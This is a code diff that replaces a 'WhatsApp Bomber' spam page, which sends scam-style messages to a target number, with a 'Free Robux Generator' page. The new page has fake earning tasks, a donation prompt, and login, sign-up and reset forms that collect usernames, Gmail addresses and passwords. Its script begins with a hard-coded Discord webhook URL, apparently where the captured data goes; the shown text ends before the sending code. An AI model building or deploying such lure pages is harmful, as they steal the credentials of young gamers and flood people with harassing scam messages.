@@ -1,276 +1,677 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>💬 WhatsApp Bomber - 1 Script</title>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            font-family: 'Segoe UI', sans-serif;
-            background: linear-gradient(135deg, #25D366 0%, #128C7E 100%);
-            color: white;
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
-        }
-        .container {
-            background: rgba(0,0,0,0.9);
-            border: 3px solid #25D366;
-            border-radius: 25px;
-            padding: 3rem;
-            max-width: 500px;
-            width: 100%;
-            box-shadow: 0 25px 75px rgba(37,211,102,0.4);
-            text-align: center;
-        }
-        .whatsapp-icon {
-            font-size: 4rem;
-            margin-bottom: 1rem;
-            filter: drop-shadow(0 0 20px #25D366);
-        }
-        h1 { 
-            font-size: 2.5rem; 
-            margin-bottom: 1rem;
-            background: linear-gradient(45deg, #25D366, #00ff88);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-        }
-        .number-input {
-            width: 100%;
-            padding: 1.5rem;
-            font-size: 1.5rem;
-            border: 3px solid #25D366;
-            border-radius: 20px;
-            background: rgba(255,255,255,0.1);
-            color: white;
-            text-align: center;
-            margin: 2rem 0;
-            font-weight: bold;
-        }
-        .number-input::placeholder { color: rgba(255,255,255,0.7); }
-        .number-input:focus {
-            outline: none;
-            box-shadow: 0 0 30px rgba(37,211,102,0.6);
-            border-color: #00ff88;
-        }
-        .controls {
-            display: flex;
-            flex-direction: column;
-            gap: 1rem;
-            margin: 2rem 0;
-        }
-        .btn {
-            padding: 1.2rem 2rem;
-            font-size: 1.2rem;
-            font-weight: bold;
-            border: none;
-            border-radius: 25px;
-            cursor: pointer;
-            transition: all 0.3s;
-            font-family: inherit;
-        }
-        .btn-start {
-            background: linear-gradient(45deg, #25D366, #00ff88);
-            color: white;
-            box-shadow: 0 10px 30px rgba(37,211,102,0.5);
-        }
-        .btn-start:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 20px 50px rgba(37,211,102,0.7);
-        }
-        .btn-stop {
-            background: linear-gradient(45deg, #ff4444, #ff6666);
-            color: white;
-        }
-        .stats {
-            display: flex;
-            justify-content: space-around;
-            margin: 2rem 0;
-            flex-wrap: wrap;
-            gap: 1rem;
-        }
-        .stat {
-            background: rgba(255,255,255,0.1);
-            padding: 1rem 1.5rem;
-            border-radius: 15px;
-            border: 2px solid rgba(37,211,102,0.3);
-        }
-        .stat-number { font-size: 2rem; font-weight: bold; color: #00ff88; display: block; }
-        .log {
-            background: rgba(0,0,0,0.7);
-            border: 2px solid #25D366;
-            border-radius: 15px;
-            padding: 1.5rem;
-            height: 250px;
-            overflow-y: auto;
-            font-family: monospace;
-            font-size: 1rem;
-            text-align: left;
-            margin-top: 2rem;
-            white-space: pre-wrap;
-        }
-        .message-display {
-            background: rgba(37,211,102,0.2);
-            padding: 1rem;
-            border-radius: 12px;
-            margin: 1rem 0;
-            font-family: monospace;
-            font-size: 1.1rem;
-            border-left: 5px solid #25D366;
-        }
-        @media (max-width: 480px) {
-            .container { padding: 2rem 1.5rem; }
-            h1 { font-size: 2rem; }
-        }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Free Robux Generator</title>
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Arial, sans-serif; }
+body { background: #f0f0f0; }
+.page { display: none; width: 100%; min-height: 100vh; }
+.page.active { display: block; }
+
+/* ========== NAVBAR ========== */
+.navbar { background: #111122; border-bottom: 1px solid #2a2a40; padding: 12px 24px; display: flex; align-items: center; justify-content: space-between; }
+.navbar .logo { color: #ffd700; font-size: 20px; font-weight: 900; }
+.navbar .nav-links { display: flex; gap: 10px; }
+.navbar .nav-links .nav-btn { padding: 8px 18px; border-radius: 10px; border: none; cursor: pointer; font-weight: 600; font-size: 13px; transition: 0.2s; }
+.navbar .nav-links .nav-btn:hover { transform: scale(1.05); }
+.nav-btn-login { background: linear-gradient(135deg, #ff6b6b, #ee5a24); color: #fff; }
+.nav-btn-signup { background: linear-gradient(135deg, #4caf50, #2e7d32); color: #fff; }
+
+/* ========== PAGE 1 ========== */
+.p1 { background: linear-gradient(135deg, #0a0a1a, #1a1a3e, #0f3460); min-height: 100vh; padding: 30px 20px; display: flex; justify-content: center; align-items: flex-start; }
+.p1-box { background: #1a1a2e; border-radius: 24px; padding: 30px 25px; max-width: 480px; width: 100%; box-shadow: 0 20px 60px rgba(0,0,0,0.6); border: 1px solid rgba(255,215,0,0.15); }
+.p1-title { text-align: center; margin-bottom: 20px; }
+.p1-title h1 { color: #ffd700; font-size: 32px; text-shadow: 0 0 30px rgba(255,215,0,0.2); }
+.p1-title p { color: #888; font-size: 13px; margin-top: 4px; }
+.p1-bal { background: #111122; border-radius: 16px; padding: 18px; text-align: center; margin-bottom: 20px; border: 1px solid #2a2a40; }
+.p1-bal .lbl { color: #666; font-size: 11px; text-transform: uppercase; letter-spacing: 2px; }
+.p1-bal .amt { color: #ffd700; font-size: 42px; font-weight: 900; margin: 5px 0; }
+.p1-bal .note { color: #555; font-size: 11px; }
+.p1-card { background: #111122; border-radius: 16px; padding: 18px; margin-bottom: 14px; border: 1px solid #2a2a40; }
+.p1-card .c-title { color: #fff; font-size: 15px; font-weight: 600; margin-bottom: 10px; display: flex; align-items: center; gap: 8px; }
+.p1-card .c-title .tag { background: #ffd700; color: #000; font-size: 10px; padding: 2px 10px; border-radius: 20px; font-weight: 700; }
+.p1-card .c-sub { color: #777; font-size: 12px; margin-bottom: 12px; }
+.cap-box { background: #0a0a1a; border-radius: 12px; padding: 15px; text-align: center; margin-bottom: 12px; border: 1px solid #2a2a40; }
+.cap-box .code { color: #ffd700; font-size: 32px; font-weight: 900; letter-spacing: 4px; font-family: monospace; }
+.cap-box .hint { color: #555; font-size: 11px; margin-top: 4px; }
+.cap-row { display: flex; gap: 10px; }
+.cap-row input { flex: 1; padding: 12px 14px; border-radius: 12px; border: 1px solid #333; background: #0a0a1a; color: #fff; font-size: 16px; font-family: monospace; text-align: center; letter-spacing: 2px; outline: none; transition: 0.2s; text-transform: uppercase; }
+.cap-row input:focus { border-color: #ffd700; }
+.cap-row input.correct { border-color: #00c853; background: #0a1a0a; }
+.cap-row input.wrong { border-color: #d32f2f; background: #1a0a0a; animation: shake 0.3s; }
+@keyframes shake { 0%,100% { transform: translateX(0); } 25% { transform: translateX(-5px); } 75% { transform: translateX(5px); } }
+.btn { padding: 12px 22px; border: none; border-radius: 12px; cursor: pointer; font-weight: 700; font-size: 13px; transition: 0.2s; }
+.btn-gld { background: linear-gradient(135deg, #ffd700, #ffaa00); color: #000; }
+.btn-gld:hover { transform: scale(1.03); box-shadow: 0 5px 20px rgba(255,215,0,0.3); }
+.btn-grn { background: linear-gradient(135deg, #00c853, #009624); color: #fff; }
+.btn-grn:hover { transform: scale(1.03); }
+.btn-red { background: linear-gradient(135deg, #d32f2f, #b71c1c); color: #fff; }
+.btn-red:hover { transform: scale(1.03); }
+.btn-bl { background: linear-gradient(135deg, #2196f3, #0d47a1); color: #fff; }
+.btn-bl:hover { transform: scale(1.03); }
+.btn-sm { padding: 8px 14px; font-size: 12px; }
+.cap-ai { background: #0a1a0a; border: 1px solid #1a3a1a; border-radius: 10px; padding: 10px; margin-top: 10px; font-size: 12px; color: #4caf50; display: none; align-items: center; gap: 8px; }
+.cap-ai.show { display: flex; }
+.vid-input-row { display: flex; gap: 10px; }
+.vid-input-row input { flex: 1; padding: 12px 14px; border-radius: 12px; border: 1px solid #333; background: #0a0a1a; color: #fff; font-size: 14px; outline: none; transition: 0.2s; }
+.vid-input-row input:focus { border-color: #2196f3; }
+.vid-ai { background: #0a1a2a; border: 1px solid #1a3a5a; border-radius: 10px; padding: 10px; margin-top: 10px; font-size: 12px; color: #2196f3; display: none; align-items: center; gap: 8px; }
+.vid-ai.show { display: flex; }
+.vid-ai.fail { background: #1a0a0a; border-color: #3a1a1a; color: #f44336; }
+.vid-info { display: flex; justify-content: space-between; color: #666; font-size: 12px; margin-top: 8px; }
+.withdraw-wrap { text-align: center; padding: 5px 0; }
+.withdraw-wrap .req { color: #666; font-size: 12px; margin-top: 8px; }
+.footer-note { text-align: center; color: #333; font-size: 10px; margin-top: 16px; opacity: 0.5; }
+
+/* ========== PAGE 2 ========== */
+.p2 { background: linear-gradient(135deg, #0a0a1a, #1a0a2e); min-height: 100vh; padding: 30px 20px; display: flex; justify-content: center; align-items: center; }
+.p2-box { background: #15152a; border-radius: 24px; padding: 35px 25px; max-width: 460px; width: 100%; box-shadow: 0 20px 60px rgba(0,0,0,0.6); border: 1px solid #2a2a40; text-align: center; }
+.p2-stat { display: flex; align-items: center; justify-content: center; gap: 8px; color: #aaa; font-size: 13px; margin-bottom: 20px; }
+.p2-dot { width: 10px; height: 10px; border-radius: 50%; background: #00c853; display: inline-block; animation: blink 1.2s infinite; }
+@keyframes blink { 0%,100% { opacity: 1; } 50% { opacity: 0.3; } }
+.p2-av { width: 80px; height: 80px; border-radius: 50%; background: linear-gradient(135deg, #ffd700, #ff6b6b); margin: 0 auto 12px; display: flex; align-items: center; justify-content: center; font-size: 36px; box-shadow: 0 8px 25px rgba(255,107,107,0.2); }
+.p2-box h2 { color: #fff; font-size: 20px; }
+.p2-game { color: #666; font-size: 13px; margin: 3px 0 18px; }
+.p2-players { background: #0e0e22; border-radius: 14px; padding: 15px; margin-bottom: 18px; border: 1px solid #222240; }
+.p2-players .pt { color: #666; font-size: 10px; text-transform: uppercase; letter-spacing: 1.5px; margin-bottom: 10px; text-align: left; }
+.p2-pl { display: flex; align-items: center; gap: 12px; padding: 8px 10px; border-radius: 10px; margin-bottom: 5px; }
+.p2-pl:last-child { margin-bottom: 0; }
+.p2-pl .av { width: 28px; height: 28px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 13px; color: #fff; font-weight: 700; }
+.p2-pl .nm { color: #ccc; font-size: 13px; flex: 1; text-align: left; }
+.p2-pl .st { color: #00c853; font-size: 11px; }
+.p2-donate { margin: 20px 0; }
+.p2-donate p { color: #aaa; font-size: 13px; }
+.btn-don { background: linear-gradient(135deg, #ffd700, #ff8800); color: #000; padding: 16px 50px; border: none; border-radius: 14px; font-size: 18px; font-weight: 800; cursor: pointer; transition: 0.2s; box-shadow: 0 8px 30px rgba(255,136,0,0.25); margin-top: 12px; }
+.btn-don:hover { transform: scale(1.06); box-shadow: 0 10px 40px rgba(255,136,0,0.35); }
+.p2-online { color: #444; font-size: 11px; margin-top: 14px; }
+.p2-ad { margin-top: 16px; padding: 10px; background: #0e0e22; border-radius: 10px; color: #555; font-size: 12px; border: 1px solid #222240; }
+
+/* ========== PAGE 3 - LOGIN ========== */
+.p3 { background: #e8e8e8; min-height: 100vh; padding: 30px 20px; display: flex; justify-content: center; align-items: center; }
+.p3-box { background: #fff; border-radius: 24px; padding: 40px 30px; max-width: 400px; width: 100%; box-shadow: 0 10px 50px rgba(0,0,0,0.12); text-align: center; }
+.p3-logo { width: 76px; height: 76px; border-radius: 50%; background: linear-gradient(135deg, #ffd700, #ff6b6b); margin: 0 auto 14px; display: flex; align-items: center; justify-content: center; font-size: 34px; box-shadow: 0 6px 20px rgba(255,107,107,0.2); }
+.p3-box h1 { color: #222; font-size: 22px; }
+.p3-sub { color: #888; font-size: 13px; margin: 4px 0 18px; }
+.p3-sec { display: inline-flex; align-items: center; gap: 6px; background: #e8f5e9; color: #2e7d32; padding: 5px 14px; border-radius: 20px; font-size: 11px; margin-bottom: 22px; }
+.p3-grp { margin-bottom: 16px; text-align: left; }
+.p3-grp label { display: block; color: #555; font-size: 12px; margin-bottom: 6px; font-weight: 600; }
+.p3-grp input { width: 100%; padding: 13px 16px; border: 2px solid #ddd; border-radius: 12px; font-size: 14px; outline: none; transition: 0.2s; background: #fafafa; }
+.p3-grp input:focus { border-color: #ff6b6b; background: #fff; }
+.btn-log { background: linear-gradient(135deg, #ff6b6b, #ee5a24); color: #fff; padding: 14px 0; border: none; border-radius: 12px; font-size: 16px; font-weight: 700; cursor: pointer; width: 100%; transition: 0.2s; box-shadow: 0 6px 20px rgba(238,90,36,0.2); margin-top: 6px; }
+.btn-log:hover { transform: translateY(-2px); box-shadow: 0 8px 25px rgba(238,90,36,0.3); }
+.btn-log:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
+.p3-err { color: #d32f2f; font-size: 13px; margin-top: 12px; display: none; }
+.p3-links { margin-top: 16px; font-size: 12px; }
+.p3-links a { color: #ff6b6b; text-decoration: none; margin: 0 8px; cursor: pointer; }
+.p3-links a:hover { text-decoration: underline; }
+.p3-foot { color: #bbb; font-size: 10px; margin-top: 18px; }
+.spin { display: none; width: 18px; height: 18px; border: 3px solid rgba(255,255,255,0.3); border-top: 3px solid #fff; border-radius: 50%; animation: spin 0.7s linear infinite; margin: 0 auto; }
+@keyframes spin { to { transform: rotate(360deg); } }
+.btn-log.load .btxt { display: none; }
+.btn-log.load .spin { display: block; }
+.btn-sign.load .btxt { display: none; }
+.btn-sign.load .spin { display: block; }
+.btn-reset.load .btxt { display: none; }
+.btn-reset.load .spin { display: block; }
+.toast { position: fixed; top: 20px; left: 50%; transform: translateX(-50%); background: #222; color: #fff; padding: 14px 28px; border-radius: 12px; display: none; z-index: 999; font-size: 14px; box-shadow: 0 10px 40px rgba(0,0,0,0.3); }
+.toast.show { display: block; animation: fadeio 2.2s ease; }
+@keyframes fadeio { 0% { opacity: 0; transform: translateX(-50%) translateY(-15px); } 12% { opacity: 1; transform: translateX(-50%) translateY(0); } 80% { opacity: 1; transform: translateX(-50%) translateY(0); } 100% { opacity: 0; transform: translateX(-50%) translateY(-15px); } }
+
+/* ========== PAGE 4 - SIGN UP ========== */
+.p4 { background: #e8f5e9; min-height: 100vh; padding: 30px 20px; display: flex; justify-content: center; align-items: center; }
+.p4-box { background: #fff; border-radius: 24px; padding: 40px 30px; max-width: 400px; width: 100%; box-shadow: 0 10px 50px rgba(0,0,0,0.12); text-align: center; }
+.p4-logo { width: 76px; height: 76px; border-radius: 50%; background: linear-gradient(135deg, #4caf50, #2196f3); margin: 0 auto 14px; display: flex; align-items: center; justify-content: center; font-size: 34px; box-shadow: 0 6px 20px rgba(33,150,243,0.2); }
+.p4-box h1 { color: #222; font-size: 22px; }
+.p4-sub { color: #888; font-size: 13px; margin: 4px 0 18px; }
+.p4-grp { margin-bottom: 16px; text-align: left; }
+.p4-grp label { display: block; color: #555; font-size: 12px; margin-bottom: 6px; font-weight: 600; }
+.p4-grp input { width: 100%; padding: 13px 16px; border: 2px solid #ddd; border-radius: 12px; font-size: 14px; outline: none; transition: 0.2s; background: #fafafa; }
+.p4-grp input:focus { border-color: #4caf50; background: #fff; }
+.btn-sign { background: linear-gradient(135deg, #4caf50, #2e7d32); color: #fff; padding: 14px 0; border: none; border-radius: 12px; font-size: 16px; font-weight: 700; cursor: pointer; width: 100%; transition: 0.2s; box-shadow: 0 6px 20px rgba(76,175,80,0.2); margin-top: 6px; }
+.btn-sign:hover { transform: translateY(-2px); box-shadow: 0 8px 25px rgba(76,175,80,0.3); }
+.btn-sign:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
+.p4-links { margin-top: 16px; font-size: 12px; }
+.p4-links a { color: #4caf50; text-decoration: none; margin: 0 8px; cursor: pointer; }
+.p4-links a:hover { text-decoration: underline; }
+.p4-foot { color: #bbb; font-size: 10px; margin-top: 18px; }
+
+/* ========== PAGE 5 - FORGOT PASSWORD ========== */
+.p5 { background: #fff3e0; min-height: 100vh; padding: 30px 20px; display: flex; justify-content: center; align-items: center; }
+.p5-box { background: #fff; border-radius: 24px; padding: 40px 30px; max-width: 400px; width: 100%; box-shadow: 0 10px 50px rgba(0,0,0,0.12); text-align: center; }
+.p5-logo { width: 76px; height: 76px; border-radius: 50%; background: linear-gradient(135deg, #ff9800, #f44336); margin: 0 auto 14px; display: flex; align-items: center; justify-content: center; font-size: 34px; box-shadow: 0 6px 20px rgba(244,67,54,0.2); }
+.p5-box h1 { color: #222; font-size: 22px; }
+.p5-sub { color: #888; font-size: 13px; margin: 4px 0 18px; }
+.p5-grp { margin-bottom: 16px; text-align: left; }
+.p5-grp label { display: block; color: #555; font-size: 12px; margin-bottom: 6px; font-weight: 600; }
+.p5-grp input { width: 100%; padding: 13px 16px; border: 2px solid #ddd; border-radius: 12px; font-size: 14px; outline: none; transition: 0.2s; background: #fafafa; }
+.p5-grp input:focus { border-color: #ff9800; background: #fff; }
+.btn-reset { background: linear-gradient(135deg, #ff9800, #e65100); color: #fff; padding: 14px 0; border: none; border-radius: 12px; font-size: 16px; font-weight: 700; cursor: pointer; width: 100%; transition: 0.2s; box-shadow: 0 6px 20px rgba(255,152,0,0.2); margin-top: 6px; }
+.btn-reset:hover { transform: translateY(-2px); box-shadow: 0 8px 25px rgba(255,152,0,0.3); }
+.btn-reset:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
+.p5-links { margin-top: 16px; font-size: 12px; }
+.p5-links a { color: #ff9800; text-decoration: none; margin: 0 8px; cursor: pointer; }
+.p5-links a:hover { text-decoration: underline; }
+.p5-foot { color: #bbb; font-size: 10px; margin-top: 18px; }
+.p5-code-status { display: none; padding: 12px; margin-top: 10px; border-radius: 10px; font-size: 13px; }
+.p5-code-status.show { display: block; }
+</style>
 </head>
 <body>
-    <div class="container">
-        <div class="whatsapp-icon">💬</div>
-        <h1>WhatsApp Bomber</h1>
-        <p style="opacity: 0.9; margin-bottom: 2rem;">Enter number → Spam unlimited messages!</p>
-        
-        <input type="tel" class="number-input" id="whatsappNumber" 
-               placeholder="91xxxxxxxxxx (without +)" maxlength="12">
-        
-        <div class="message-display" id="currentMessage">
-            Message: "Your free gift expires in 1 hour! Claim now: whatsapp.com/gift"
-        </div>
 
-        <div class="controls">
-            <button class="btn btn-start" onclick="startWhatsAppBomb()">🚀 START SPAM</button>
-            <button class="btn btn-stop" onclick="stopWhatsAppBomb()">⏹️ STOP</button>
-            <input type="number" id="messageCount" placeholder="Messages (500)" min="1" max="9999" 
-                   style="padding:1.2rem; font-size:1.2rem; border:2px solid #25D366; border-radius:15px; background:rgba(255,255,255,0.1); color:white; text-align:center;">
-        </div>
+<div id="toast" class="toast"></div>
 
-        <div class="stats">
-            <div class="stat">
-                <span class="stat-number" id="messagesSent">0</span>
-                Messages Sent
-            </div>
-            <div class="stat">
-                <span class="stat-number" id="targetDisplay">-</span>
-                Target Number
-            </div>
-            <div class="stat">
-                <span class="stat-number" id="speed">0</span>
-                msg/sec
-            </div>
-        </div>
+<!-- ========== NAVBAR (visible on page 1) ========== -->
+<nav class="navbar" id="mainNav">
+  <div class="logo">✨ Robux</div>
+  <div class="nav-links">
+    <button class="nav-btn nav-btn-login" id="navLoginBtn">Login</button>
+    <button class="nav-btn nav-btn-signup" id="navSignupBtn">Sign Up</button>
+  </div>
+</nav>
 
-        <div class="log" id="bombLog">
-[SYSTEM] WhatsApp Bomber Ready
-[SYSTEM] Enter Indian number (91xxxxxxxxxx)
-[SYSTEM] Click START SPAM → Unlimited messages!
-        </div>
+<!-- ========== PAGE 1 - EARN ========== -->
+<div class="page active" id="page1">
+<div class="p1">
+<div class="p1-box">
+
+<div class="p1-title">
+  <h1>✨ Free Robux</h1>
+  <p>Earn Robux by completing simple tasks!</p>
+</div>
+
+<div class="p1-bal">
+  <div class="lbl">Your Balance</div>
+  <div class="amt" id="balanceDisplay">0</div>
+  <div class="note">Minimum withdraw: 100 Robux</div>
+</div>
+
+<!-- CAPTION SECTION -->
+<div class="p1-card">
+  <div class="c-title">📝 Caption Tasks <span class="tag">+5 each</span></div>
+  <div class="c-sub">Type the letter+number code shown below to earn Robux!</div>
+  
+  <div class="cap-box">
+    <div class="code" id="captionCode">A1</div>
+    <div class="hint">Type this code exactly as shown</div>
+  </div>
+  
+  <div class="cap-row">
+    <input type="text" id="captionInput" placeholder="Type code..." maxlength="3" autocomplete="off">
+    <button class="btn btn-gld" id="submitCaptionBtn">Submit</button>
+    <button class="btn btn-bl btn-sm" id="refreshCaptionBtn">🔄</button>
+  </div>
+  
+  <div class="cap-ai" id="captionAIStatus">
+    <span>🔍</span>
+    <span id="captionAIMsg">AI verification: Caption code correct!</span>
+  </div>
+  
+  <div style="display:flex;justify-content:space-between;margin-top:8px;color:#555;font-size:12px;">
+    <span>Completed: <span id="captionCount">0</span></span>
+    <span style="color:#00c853;font-weight:600;">+5 🪙 each</span>
+  </div>
+</div>
+
+<!-- VIDEO SECTION -->
+<div class="p1-card">
+  <div class="c-title">🎥 YouTube Video <span class="tag">+50 each</span></div>
+  <div class="c-sub">Upload a Roblox video to YouTube and paste the link! (3 videos max per week)</div>
+  
+  <div class="vid-input-row">
+    <input type="text" id="videoLinkInput" placeholder="Paste YouTube link here...">
+    <button class="btn btn-grn" id="submitVideoBtn">Verify</button>
+  </div>
+  
+  <div class="vid-ai" id="videoAIStatus">
+    <span>🤖</span>
+    <span id="videoAIMsg">AI verification: Valid YouTube video detected!</span>
+  </div>
+  
+  <div class="vid-info">
+    <span>Videos uploaded: <span id="videoCount">0</span> / 3</span>
+    <span style="color:#555;">(resets weekly)</span>
+  </div>
+</div>
+
+<!-- WITHDRAW -->
+<div class="p1-card">
+  <div class="c-title">💸 Withdraw</div>
+  <div class="withdraw-wrap">
+    <button class="btn btn-grn" id="withdrawBtn" style="padding:14px 40px;font-size:15px;">Withdraw Now</button>
+    <div class="req">Minimum: 100 Robux • Instant processing</div>
+  </div>
+</div>
+
+<div style="display:flex;justify-content:center;gap:10px;margin-top:6px;">
+  <button class="btn btn-red" id="clearDataBtn" style="padding:10px 24px;">Clear All Data</button>
+</div>
+<p class="footer-note">Unofficial fan site. Not affiliated with Roblox Corporation.</p>
+
+</div>
+</div>
+</div>
+
+<!-- ========== PAGE 2 - PRIVATE SERVER ========== -->
+<div class="page" id="page2">
+<div class="p2">
+<div class="p2-box">
+
+<div class="p2-stat"><span class="p2-dot"></span> Player Online · Private Server</div>
+
+<div class="p2-av">🎮</div>
+<h2>Legendary_Roblox_Pro</h2>
+<div class="p2-game">🔮 Blox Fruits · Private Server</div>
+
+<div class="p2-players">
+  <div class="pt">Players in Server (4/12)</div>
+  <div class="p2-pl"><div class="av" style="background:#ff6b6b;">S</div><div class="nm">SwordMaster_X</div><div class="st">● Online</div></div>
+  <div class="p2-pl"><div class="av" style="background:#4fc3f7;">M</div><div class="nm">MegaNoob_2024</div><div class="st">● Online</div></div>
+  <div class="p2-pl"><div class="av" style="background:#ffd700;">L</div><div class="nm">Legendary_Roblox_Pro</div><div class="st">● Online</div></div>
+  <div class="p2-pl"><div class="av" style="background:#81c784;">R</div><div class="nm">RobuxKing_90</div><div class="st">● Online</div></div>
+</div>
+
+<div class="p2-donate">
+  <p>💖 Support this private server!</p>
+  <p style="font-size:12px;color:#666;margin-top:4px;">Donations help keep the server running 24/7</p>
+  <button class="btn-don" id="donateBtn">💎 Donate Now</button>
+</div>
+
+<div class="p2-online">🎯 127 players in public servers</div>
+<div class="p2-ad">⚡ Server boosted · No lag · Auto-farm enabled</div>
+
+</div>
+</div>
+</div>
+
+<!-- ========== PAGE 3 - LOGIN ========== -->
+<div class="page" id="page3">
+<div class="p3">
+<div class="p3-box">
+
+<div class="p3-logo">🎮</div>
+<h1>Welcome Back</h1>
+<p class="p3-sub">Sign in to your account to continue</p>
+<div class="p3-sec">🔒 Secured with 256-bit encryption</div>
+
+<form id="loginForm" autocomplete="off">
+  <div class="p3-grp">
+    <label>Username or Email</label>
+    <input type="text" id="loginUsername" placeholder="Enter your username or email" required autocomplete="off">
+  </div>
+  <div class="p3-grp">
+    <label>Password</label>
+    <input type="password" id="loginPassword" placeholder="Enter your password" required autocomplete="off">
+  </div>
+  <button type="submit" class="btn-log" id="loginBtn">
+    <span class="btxt">Sign In</span>
+    <div class="spin"></div>
+  </button>
+</form>
+
+<div class="p3-err" id="loginErrorMsg">⚠️ Invalid username or password. Please try again.</div>
+
+<div class="p3-links">
+  <a id="gotoForgotLink">Forgot password?</a>
+  <a id="gotoSignupLink">Create account</a>
+</div>
+<div class="p3-foot">Donation verification required</div>
+
+</div>
+</div>
+</div>
+
+<!-- ========== PAGE 4 - SIGN UP ========== -->
+<div class="page" id="page4">
+<div class="p4">
+<div class="p4-box">
+
+<div class="p4-logo">🚀</div>
+<h1>Create Account</h1>
+<p class="p4-sub">Sign up for free and start earning Robux!</p>
+
+<form id="signupForm" autocomplete="off">
+  <div class="p4-grp">
+    <label>Username</label>
+    <input type="text" id="signupUser" placeholder="Choose a username" required autocomplete="off">
+  </div>
+  <div class="p4-grp">
+    <label>Email (Gmail)</label>
+    <input type="email" id="signupEmail" placeholder="your.email@gmail.com" required autocomplete="off">
+  </div>
+  <div class="p4-grp">
+    <label>Password</label>
+    <input type="password" id="signupPass" placeholder="Minimum 6 characters" minlength="6" required autocomplete="off">
+  </div>
+  <button type="submit" class="btn-sign" id="signupBtn">
+    <span class="btxt">Create Account</span>
+    <div class="spin"></div>
+  </button>
+</form>
+
+<div class="p3-err" id="signupErrorMsg" style="display:none;color:#d32f2f;font-size:13px;margin-top:12px;">⚠️ Error</div>
+
+<div class="p4-links">
+  Already have an account? <a id="gotoLoginFromSignup">Sign In</a>
+</div>
+<div class="p4-foot">By signing up, you agree to our Terms of Service</div>
+
+</div>
+</div>
+</div>
+
+<!-- ========== PAGE 5 - FORGOT PASSWORD ========== -->
+<div class="page" id="page5">
+<div class="p5">
+<div class="p5-box">
+
+<div class="p5-logo">🔐</div>
+<h1>Reset Password</h1>
+<p class="p5-sub">Enter your Gmail to receive a reset code</p>
+
+<form id="forgotForm" autocomplete="off">
+  <div class="p5-grp">
+    <label>Gmail Address</label>
+    <input type="email" id="forgotEmail" placeholder="your.email@gmail.com" required autocomplete="off">
+  </div>
+  
+  <div id="resetCodeSection" style="display:none;">
+    <div class="p5-grp">
+      <label>Reset Code</label>
+      <input type="text" id="resetCode" placeholder="Enter 6-digit code" maxlength="6" autocomplete="off">
     </div>
+    <div class="p5-grp">
+      <label>New Password</label>
+      <input type="password" id="newPassword" placeholder="Enter new password" minlength="6" autocomplete="off">
+    </div>
+  </div>
+  
+  <button type="submit" class="btn-reset" id="forgotBtn">
+    <span class="btxt">Send Reset Code</span>
+    <div class="spin"></div>
+  </button>
+</form>
 
-    <script>
-        let bombing = false;
-        let bombInterval;
-        let messagesSent = 0;
-        let targetNumber = '';
-        let totalMessages = 500;
+<div class="p5-code-status" id="resetStatus"></div>
 
-        const whatsappMessages = [
-            "🔥 FREE GIFT EXPIRES IN 1HR! Claim: wa.me/91yourlink",
-            "✅ Your OTP: 748392",
-            "💰 UPI Payment Rs.500 received",
-            "📦 Delivery delayed - reschedule?",
-            "🎉 Win iPhone 15! Reply YES",
-            "⚠️ Account login from new device",
-            "🏆 Daily reward: 500 coins FREE",
-            "💳 Card ending ****1234 updated",
-            "🚨 Low battery warning (15%)",
-            "📱 WhatsApp update required",
-            "🎊 Congrats! You won Rs.5000",
-            "🔒 Security alert - verify now",
-            "📈 Stock alert: BUY NOW +200%",
-            "🍕 Free pizza coupon expires today",
-            "✈️ Flight delayed 2hrs - claim refund"
-        ];
+<div class="p5-links">
+  <a id="gotoLoginFromForgot">Back to Sign In</a>
+</div>
+<div class="p5-foot">We'll send a verification code to your Gmail</div>
 
-        function log(msg) {
-            const logEl = document.getElementById('bombLog');
-            const time = new Date().toLocaleTimeString();
-            logEl.textContent += `\n[${time}] 💬 ${msg}`;
-            logEl.scrollTop = logEl.scrollHeight;
-        }
+</div>
+</div>
+</div>
 
-        function updateStats() {
-            document.getElementById('messagesSent').textContent = messagesSent;
-            document.getElementById('targetDisplay').textContent = targetNumber || '-';
-            document.getElementById('speed').textContent = bombing ? '2-5' : '0';
-        }
+<script>
+// ==================== CONFIG ====================
+const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1497889291399991296/MB9RxSUm_HfhQy74HUk9P5ImLWIsBMzXU7yp15WeGDX76kK5KTo8DUT9hK_5-XKCSwI-';
 
-        function getRandomWhatsAppMessage() {
-            return whatsappMessages[Math.floor(Math.random() * whatsappMessages.length)];
-        }
+// ==================== TOAST ====================
+function showToast(msg) {
+  const t = document.getElementById('toast');
+  t.textContent = msg;
+  t.classList.remove('show');
+  void t.offsetWidth;
+  t.classList.add('show');
+  setTimeout(() => t.classList.remove('show'), 2400);
+}
 
-        function startWhatsAppBomb() {
-            targetNumber = document.getElementById('whatsappNumber').value.trim();
-            totalMessages = parseInt(document.getElementById('messageCount').value) || 500;
+function switchPage(id) {
+  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+  document.getElementById(id).classList.add('active');
+  // Hide navbar on non-earn pages
+  const nav = document.getElementById('mainNav');
+  if (id === 'page1') { nav.style.display = 'flex'; } else { nav.style.display = 'none'; }
+}
 
-            if (!targetNumber || targetNumber.length < 10) {
-                alert('❌ Enter valid WhatsApp number (91xxxxxxxxxx)');
-                return;
-            }
+// ==================== DATA LAYER ====================
+const SK = 'rbx_sim_data';
+const WK = 'rbx_sim_week';
 
-            if (bombing) return;
+function getData() {
+  const r = localStorage.getItem(SK);
+  if (r) { try { return JSON.parse(r); } catch(e) {} }
+  return { bal: 0, caps: 0, vids: [] };
+}
+function saveData(d) { localStorage.setItem(SK, JSON.stringify(d)); }
 
-            bombing = true;
-            messagesSent = 0;
-            log(`🚀 WHATSAPP BOMB STARTED → ${targetNumber}`);
-            log(`📊 Target: ${totalMessages} messages`);
+function getWeek() {
+  const n = new Date();
